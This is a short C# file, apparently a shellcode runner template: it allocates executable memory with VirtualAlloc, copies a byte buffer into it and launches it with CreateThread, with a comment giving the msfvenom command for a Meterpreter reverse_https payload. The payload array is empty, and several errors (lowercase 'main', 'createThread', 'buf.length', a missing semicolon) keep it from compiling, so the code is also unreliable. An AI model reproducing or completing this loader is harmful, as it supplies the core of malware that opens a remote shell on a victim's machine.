using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices; 


//msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT=443 -f csharp

class Program{
	[DllImport("kernel32.dll", SetLastError= true, ExactSpelling= true)]
	static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint fAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("kernel32.dll")]
	public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

	static void main(String[] args){
		byte[] buf= new byte[722]{

		}
		
		int size= buf.length;

		IntPtr addr= VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
		Marshal.Copy(buf,0,addr,size);

		IntPtr hThread= createThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

		WaitForSingleObject(hThread, 0xFFFFFFFF);
	}
}
